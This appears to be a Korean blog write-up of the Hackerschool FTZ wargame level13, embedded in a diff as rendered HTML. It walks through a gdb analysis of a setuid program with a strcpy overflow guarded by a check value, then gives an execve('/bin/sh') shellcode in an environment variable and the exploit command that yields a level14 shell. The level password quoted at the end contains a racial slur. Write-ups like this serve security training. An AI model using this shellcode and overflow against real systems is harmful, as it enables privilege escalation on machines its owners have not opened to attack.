@@ -1,0 +1,232 @@
+I"�0<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level13 
+level13@~~~~<span class="s1">'s password: 
+[level13@ftz level13]$ ls 
+attackme  hint  public_html  tmp 
+[level13@ftz level13]$ cat hint 
+
+#include  &lt;stdlib.h&gt;
+
+main(int argc, char *argv[]) 
+{ 
+   long i=0x1234567; 
+   char buf[1024]; 
+
+   setreuid( 3094, 3094 ); 
+   if(argc &gt; 1) 
+   strcpy(buf,argv[1]); 
+
+   if(i != 0x1234567) { 
+   printf(" Warnning: Buffer Overflow !!! \n"); 
+   kill(0,11); 
+   } 
+} 
+
+[level13@ftz level13]$
+</span></code></pre></div></div>
+
+<p>level13/have no clue로 접속하자.</p>
+
+<p>hint를 보니, 버퍼오버플로우는 맞다.</p>
+
+<p>그러나 i에 0x01234567이라는 주소값을 부여한다.</p>
+
+<p>버퍼오버플로우를 하며 i의 주소값을 건드리면 프로그램이 종료된다.</p>
+
+<p>한번 gdb로 살펴보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level13@ftz level13]<span class="nv">$ </span><span class="nb">cp </span>hint /tmp/bof.c 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span><span class="nb">ls 
+</span>bof.c  mysql.sock 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> bof bof.c 
+<span class="o">[</span>level13@ftz tmp]<span class="err">$</span>
+
+
+
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span>gdb bof 
+GNU gdb Red Hat Linux <span class="o">(</span>5.3post-0.20021129.18rh<span class="o">)</span> 
+Copyright 2003 Free Software Foundation, Inc. 
+GDB is free software, covered by the GNU General Public License, and you are 
+welcome to change it and/or distribute copies of it under certain conditions. 
+Type <span class="s2">"show copying"</span> to see the conditions. 
+There is absolutely no warranty <span class="k">for </span>GDB.  Type <span class="s2">"show warranty"</span> <span class="k">for </span>details. 
+This GDB was configured as <span class="s2">"i386-redhat-linux-gnu"</span>... 
+<span class="o">(</span>gdb<span class="o">)</span> disas main 
+Dump of assembler code <span class="k">for function </span>main: 
+0x080483c8 &lt;main+0&gt;:    push   %ebp 
+0x080483c9 &lt;main+1&gt;:    mov    %esp,%ebp 
+0x080483cb &lt;main+3&gt;:    sub    <span class="nv">$0x418</span>,%esp 
+0x080483d1 &lt;main+9&gt;:    and    <span class="nv">$0xfffffff0</span>,%esp 
+0x080483d4 &lt;main+12&gt;:   mov    <span class="nv">$0x0</span>,%eax 
+0x080483d9 &lt;main+17&gt;:   sub    %eax,%esp 
+0x080483db &lt;main+19&gt;:   movl   <span class="nv">$0x1234567</span>,0xfffffff4<span class="o">(</span>%ebp<span class="o">)</span> 
+0x080483e2 &lt;main+26&gt;:   sub    <span class="nv">$0x8</span>,%esp 
+0x080483e5 &lt;main+29&gt;:   push   <span class="nv">$0xc16</span> 
+0x080483ea &lt;main+34&gt;:   push   <span class="nv">$0xc16</span> 
+0x080483ef &lt;main+39&gt;:   call   0x80482e8  &lt;setreuid&gt;
+0x080483f4 &lt;main+44&gt;:   add    <span class="nv">$0x10</span>,%esp 
+0x080483f7 &lt;main+47&gt;:   cmpl   <span class="nv">$0x1</span>,0x8<span class="o">(</span>%ebp<span class="o">)</span> 
+0x080483fb &lt;main+51&gt;:   jle    0x8048417 &lt;main+79&gt; 
+0x080483fd &lt;main+53&gt;:   sub    <span class="nv">$0x8</span>,%esp 
+0x08048400 &lt;main+56&gt;:   mov    0xc<span class="o">(</span>%ebp<span class="o">)</span>,%eax 
+0x08048403 &lt;main+59&gt;:   add    <span class="nv">$0x4</span>,%eax 
+0x08048406 &lt;main+62&gt;:   pushl  <span class="o">(</span>%eax<span class="o">)</span> 
+0x08048408 &lt;main+64&gt;:   lea    0xfffffbe8<span class="o">(</span>%ebp<span class="o">)</span>,%eax 
+0x0804840e &lt;main+70&gt;:   push   %eax 
+0x0804840f &lt;main+71&gt;:   call   0x8048308  &lt;strcpy&gt;
+0x08048414 &lt;main+76&gt;:   add    <span class="nv">$0x10</span>,%esp 
+0x08048417 &lt;main+79&gt;:   cmpl   <span class="nv">$0x1234567</span>,0xfffffff4<span class="o">(</span>%ebp<span class="o">)</span> 
+0x0804841e &lt;main+86&gt;:   je     0x804843f &lt;main+119&gt; 
+0x08048420 &lt;main+88&gt;:   sub    <span class="nv">$0xc</span>,%esp 
+0x08048423 &lt;main+91&gt;:   push   <span class="nv">$0x8048520</span> 
+0x08048428 &lt;main+96&gt;:   call   0x80482d8  &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x0804842d &lt;main+101&gt;:  add    <span class="nv">$0x10</span>,%esp 
+0x08048430 &lt;main+104&gt;:  sub    <span class="nv">$0x8</span>,%esp 
+0x08048433 &lt;main+107&gt;:  push   <span class="nv">$0xb</span> 
+0x08048435 &lt;main+109&gt;:  push   <span class="nv">$0x0</span> 
+0x08048437 &lt;main+111&gt;:  call   0x80482f8  &lt;<span class="nb">kill</span><span class="o">&gt;</span>
+0x0804843c &lt;main+116&gt;:  add    <span class="nv">$0x10</span>,%esp 
+0x0804843f &lt;main+119&gt;:  leave 
+0x08048440 &lt;main+120&gt;:  ret 
+0x08048441 &lt;main+121&gt;:  nop 
+0x08048442 &lt;main+122&gt;:  nop 
+0x08048443 &lt;main+123&gt;:  nop 
+End of assembler dump. 
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div>
+
+<p>main+19에서 i에게 주소값을 부여하는 모습이 보인다. i의 주소값은 0xfffffff4.</p>
+
+<p>main+64에서 strcpy의 인좌에 buf가 들어가는 모습이 보인다.</p>
+
+<p>buf의 주소값은 0xfffffbe8.</p>
+
+<p>main+104에서 dummy에 8만큼 부여하는 것이 보인다.</p>
+
+<p>일단 아무 값이나 넣어서 위치를 확인해보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+79 
+Breakpoint 1 at 0x8048417 
+<span class="o">(</span>gdb<span class="o">)</span> r AAAAAAAA 
+Starting program: /tmp/bof AAAAAAAA 
+
+Breakpoint 1, 0x08048417 <span class="k">in </span>main <span class="o">()</span>
+</code></pre></div></div>
+
+<p>i값이 그대로인지 확인하는 main+79에 break를 걸었다.</p>
+
+<p>gdb의 사용법을 잘 모른다면 이곳을 방문하자.</p>
+
+<p>https://mintnlatte.tistory.com/581</p>
+
+<p>아무 값이나 채워두고 esp레지스터를 확인했다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> x/264x <span class="nv">$esp</span> 
+
+0xbfffdd60:     0x41414141      0x41414141      0x00000000      0x00000000 
+0xbfffdd70:     0x00000000      0x00000000      0x00000000      0x00000000 
+0xbfffdd80:     0x00000000      0x00000000      0x00000000      0x00000000 
+0xbfffdd90:     0x00000000      0x00000000      0x400126d0      0x400126c8 
+0xbfffdda0:     0x400126ca      0x4001552c      0x514d846e      0x000001bf 
+0xbfffddb0:     0x00000000      0x00000000      0x00000000      0x00000000 
+
+.........
+
+0xbfffe160:     0x42130a14      0x4000c660      0xbfffe178      0x01234567 
+</code></pre></div></div>
+
+<p>맨 위 A의 아스키코드인 41이 채워지는 것이 보인다.</p>
+
+<p>그리고 저 밑에 내리면 0x01234567도 볼 수 있다.</p>
+
+<p>i(fffffff4) - buf(fffffbe8) = 1036</p>
+
+<p>1036개의 의미없는 값을 채워보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*1036'</span><span class="si">)</span> 
+The program being debugged has been started already. 
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y 
+
+Starting program: /tmp/bof <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*1036'</span><span class="si">)</span> 
+
+Breakpoint 1, 0x08048417 <span class="k">in </span>main <span class="o">()</span> 
+<span class="o">(</span>gdb<span class="o">)</span> x/264x <span class="nv">$esp</span> 
+0xbfffd860:     0x41414141      0x41414141      0x41414141      0x41414141 
+0xbfffd870:     0x41414141      0x41414141      0x41414141      0x41414141 
+0xbfffd880:     0x41414141      0x41414141      0x41414141      0x41414141
+
+..... 
+0xbfffdc60:     0x41414141      0x41414141      0x41414141      0x01234500
+</code></pre></div></div>
+
+<p>0x01234567의 값이 살짝 바뀌었다. 그럼 저곳에 0x01234567을 채워넣자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*1036+"\x67\x45\x23\x01"'</span><span class="si">)</span> 
+The program being debugged has been started already. 
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> uy^H^H 
+Please answer y or n. 
+The program being debugged has been started already. 
+Start it from the beginning? <span class="o">(</span>y or n<span class="o">)</span> y 
+
+Starting program: /tmp/bof <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*1036+"\x67\x45\x23\x01"'</span><span class="si">)</span> 
+
+Breakpoint 1, 0x08048417 <span class="k">in </span>main <span class="o">()</span> 
+<span class="o">(</span>gdb<span class="o">)</span> x/264x <span class="nv">$esp</span> 
+0xbfffeae0:     0x41414141      0x41414141      0x41414141      0x41414141 
+0xbfffeaf0:     0x41414141      0x41414141      0x41414141      0x41414141 
+0xbfffeb00:     0x41414141      0x41414141      0x41414141      0x41414141
+
+....
+
+0xbfffeee0:     0x41414141      0x41414141      0x41414141      0x01234567
+</code></pre></div></div>
+
+<p>이제 i의 값도 그대로 보존했다.</p>
+
+<p>이제 RET어드레스까지 값을 채우고 쉘 코드를 넣으면 되겠다.</p>
+
+<p>저 위에서 보았듯, dummy를 끝에 8 부여한다.</p>
+
+<p>그러니까 dummy(8) + SFP(4) = 12</p>
+
+<p>12개의 값을 채우고 쉘을 실행시키는 주소를 넣자.</p>
+
+<p>우선 그러려면 환경변수에 등록부터 하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*100+"\x31\xc0\x31\xdb\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+
+<p>지금까지 사용한 find 프로그램도 만들자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level13@ftz level13]<span class="nv">$ </span><span class="nb">cd</span> /tmp 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span>vi find.c 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c 
+<span class="c">#include </span>
+int main<span class="o">()</span> 
+<span class="o">{</span> 
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span> 
+<span class="o">}</span> 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> find find.c 
+<span class="o">[</span>level13@ftz tmp]<span class="nv">$ </span>./find 
+bfffff29 
+<span class="o">[</span>level13@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>쉘 코드 주소:bfffff29</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level13@ftz level13]<span class="nv">$ </span>./attackme <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*1036+"\x67\x45\x23\x01"+"\x90"*12+"\x29\xff\xff\xbf"'</span><span class="si">)</span> 
+sh-2.05b<span class="nv">$ </span><span class="nb">whoami 
+</span>level14 
+sh-2.05b<span class="nv">$ </span>my-pass 
+TERM environment variable not set. 
+
+Level14 Password is <span class="s2">"what that nigga want?"</span><span class="nb">.</span> 
+
+sh-2.05b<span class="err">$</span>
+</code></pre></div></div>
+
+<p>답을 구했다.</p>
+
+<p>level14’s password:”what that nigga want?”</p>
+
+<p>비밀번호가 좀…..</p>
+:ET
